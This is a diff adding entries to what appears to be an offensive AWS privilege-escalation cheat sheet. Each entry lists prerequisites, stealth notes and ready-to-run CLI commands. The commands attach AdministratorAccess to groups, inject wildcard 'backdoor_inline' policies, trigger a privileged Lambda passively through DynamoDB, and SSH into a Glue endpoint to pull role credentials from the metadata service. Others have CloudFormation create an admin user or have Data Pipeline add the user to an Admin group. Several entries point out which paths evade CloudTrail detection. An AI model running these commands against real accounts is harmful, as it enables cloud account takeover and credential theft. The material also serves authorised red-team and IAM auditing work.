@@ -268,3 +268,128 @@ cognito-identity:getcredentialsforidentity
 ecr:getauthorizationtoken    sso:getrolecredentials
 redshift:getclustercredentials
 ```
+
+### iam:AttachGroupPolicy — Escalate via Group Policy Attachment [added: 2026-04]
+- **Tags:** #AWS #IAM #AttachGroupPolicy #PrivEsc #GroupAbuse #PolicyAttach #SelfEscalation
+- **Trigger:** Compromised user has `iam:AttachGroupPolicy` on a group they belong to
+- **Prereq:** `iam:AttachGroupPolicy` permission on target group + membership in that group
+- **Yields:** All group members inherit AdministratorAccess (affects whole group — broader blast radius than user-scoped attach)
+- **Opsec:** Med — group policy attachment logged; visible in IAM console and affects multiple principals
+- **Context:** Useful when you can't attach policies directly to your user but control a group you're in
+- **Payload/Method:**
+```bash
+aws iam attach-group-policy --group-name <GROUP> \
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+```
+
+### iam:PutGroupPolicy — Inject Inline Admin Policy into Group [added: 2026-04]
+- **Tags:** #AWS #IAM #PutGroupPolicy #PrivEsc #InlinePolicy #GroupAbuse #SelfEscalation
+- **Trigger:** Compromised user has `iam:PutGroupPolicy` on a group they belong to
+- **Prereq:** `iam:PutGroupPolicy` permission on target group + membership in that group
+- **Yields:** Wildcard admin permissions for all group members via inline policy
+- **Opsec:** Med — inline policies harder to inventory than managed; still logged via CloudTrail
+- **Context:** Inline policies are less visible in policy audits than managed policies; stealthier than AttachGroupPolicy
+- **Payload/Method:**
+```bash
+aws iam put-group-policy --group-name <GROUP> --policy-name backdoor_inline \
+  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
+```
+
+### iam:PutRolePolicy — Inject Inline Policy into Assumable Role [added: 2026-04]
+- **Tags:** #AWS #IAM #PutRolePolicy #PrivEsc #InlinePolicy #RoleAbuse #AssumeRole
+- **Trigger:** Compromised user can assume a role AND has `iam:PutRolePolicy` on it
+- **Prereq:** `iam:PutRolePolicy` on assumable role + `sts:AssumeRole` on that role
+- **Yields:** Elevated permissions within assumed role session; inline policy grants wildcard admin
+- **Opsec:** Med — role modification within assumed session; inline policies harder to detect at scale
+- **Context:** Assume the role first, then inject inline policy to elevate within that session context
+- **Payload/Method:**
+```bash
+aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT>:role/<ROLE> --role-session-name privesc
+# export credentials, then:
+aws iam put-role-policy --role-name <ROLE> --policy-name backdoor_inline \
+  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
+```
+
+### iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping — Passive Lambda Trigger via DynamoDB [added: 2026-04]
+- **Tags:** #AWS #Lambda #DynamoDB #PassRole #PrivEsc #EventSourceMapping #ServerlessEscalation #PassiveExec
+- **Trigger:** Have PassRole + Lambda create permissions + DynamoDB stream exists; need hands-off execution
+- **Prereq:** `iam:PassRole` + `lambda:CreateFunction` + `lambda:CreateEventSourceMapping` + DynamoDB table with streams enabled + privileged Lambda execution role
+- **Yields:** Privilege escalation triggered passively when any record is inserted into DynamoDB table
+- **Opsec:** Low — no direct invocation; execution triggered by normal DynamoDB writes; harder to attribute
+- **Context:** More stealthy than direct lambda:InvokeFunction — escalation fires when table is written to; useful in environments with CloudTrail on invoke but not on DynamoDB puts
+- **Payload/Method:**
+```bash
+# Create Lambda with privesc payload
+aws lambda create-function --function-name privesc16 --runtime python3.9 \
+  --role arn:aws:iam::<ACCOUNT>:role/<PRIV_ROLE> --handler code.lambda_handler \
+  --zip-file fileb://function.zip
+
+# Attach to DynamoDB stream
+aws lambda create-event-source-mapping --function-name privesc16 \
+  --event-source-arn arn:aws:dynamodb:<REGION>:<ACCOUNT>:table/<TABLE>/stream/<STREAM_ID> \
+  --starting-position LATEST --enabled
+
+# Trigger by inserting a record
+aws dynamodb put-item --table-name <TABLE> --item '{"id":{"S":"trigger"}}'
+```
+
+### iam:PassRole + glue:CreateDevEndpoint — New Glue Endpoint with Privileged Role [added: 2026-04]
+- **Tags:** #AWS #Glue #CreateDevEndpoint #PassRole #PrivEsc #SSHKeyInjection #ServiceRoleAbuse #MetadataService
+- **Trigger:** Have iam:PassRole + glue:CreateDevEndpoint and a high-privilege role exists
+- **Prereq:** `iam:PassRole` + `glue:CreateDevEndpoint` + SSH key pair + privileged IAM role + network access to Glue endpoint
+- **Yields:** SSH shell on Glue dev endpoint with privileged role credentials via IMDS
+- **Opsec:** Low — endpoint creation logged but SSH metadata access is minimal trace
+- **Context:** Useful when Lambda/EC2 paths are blocked; Glue endpoints often overlooked in IAM reviews
+- **Payload/Method:**
+```bash
+aws glue create-dev-endpoint --endpoint-name privesc \
+  --role-arn arn:aws:iam::<ACCOUNT>:role/<PRIV_ROLE> \
+  --public-key file://~/.ssh/id_rsa.pub
+
+# Wait for READY status, get public address
+aws glue get-dev-endpoint --endpoint-name privesc
+
+# SSH in and pull creds
+ssh [email protected] -i ~/.ssh/id_rsa
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<PRIV_ROLE>
+```
+
+### iam:PassRole + cloudformation:CreateStack — Admin User via Stack Deployment [added: 2026-04]
+- **Tags:** #AWS #CloudFormation #PassRole #PrivEsc #IaC #StackDeployment #AdminUser #CredentialsInOutput
+- **Trigger:** Have PassRole + cloudformation:CreateStack and know of a privileged role to pass
+- **Prereq:** `iam:PassRole` + `cloudformation:CreateStack` + `cloudformation:DescribeStacks` + privileged CFN execution role + S3-hosted template (or inline)
+- **Yields:** New admin IAM user created by stack; credentials returned in stack outputs
+- **Opsec:** Med — stack creation and IAM resource provisioning fully logged; credentials in DescribeStacks output
+- **Context:** CloudFormation CAPABILITY_IAM allows stacks to create IAM resources; execution role does the heavy lifting even if your user lacks iam:CreateUser directly
+- **Payload/Method:**
+```bash
+# Template creates admin user with access key, exposes in stack output
+aws cloudformation create-stack --stack-name privesc \
+  --template-url https://<BUCKET>.s3.amazonaws.com/admin_user_template.json \
+  --role-arn arn:aws:iam::<ACCOUNT>:role/<PRIV_ROLE> \
+  --capabilities CAPABILITY_IAM
+
+# Wait for CREATE_COMPLETE, then retrieve creds
+aws cloudformation describe-stacks --stack-name privesc \
+  --query 'Stacks[0].Outputs'
+```
+
+### iam:PassRole + datapipeline:CreatePipeline + PutPipelineDefinition + ActivatePipeline — Shell Command via Data Pipeline [added: 2026-04]
+- **Tags:** #AWS #DataPipeline #PassRole #PrivEsc #ShellCommand #EC2Execution #DelayedExec #IAMGroupAbuse
+- **Trigger:** Have PassRole + datapipeline permissions and a privileged pipeline role; EC2 execution required
+- **Prereq:** `iam:PassRole` + `datapipeline:CreatePipeline` + `datapipeline:PutPipelineDefinition` + `datapipeline:ActivatePipeline` + role with EC2 launch + IAM permissions
+- **Yields:** Arbitrary shell command execution via EC2 launched by pipeline; can add attacker to admin group
+- **Opsec:** High — pipeline activation, EC2 launch, and IAM modification all generate CloudTrail events; delayed execution window
+- **Context:** Rarely locked down in IAM policies; useful when Lambda/Glue creation is restricted but DataPipeline permissions exist
+- **Payload/Method:**
+```bash
+aws datapipeline create-pipeline --name privesc --unique-id privesc_$(date +%s)
+
+# Define pipeline with ShellCommandActivity
+aws datapipeline put-pipeline-definition \
+  --pipeline-id <PIPELINE_ID> \
+  --pipeline-definition file://privesc_pipeline.json
+# pipeline JSON includes: "command": "aws iam add-user-to-group --group-name Admin --user-name <USER>"
+
+aws datapipeline activate-pipeline --pipeline-id <PIPELINE_ID>
+```
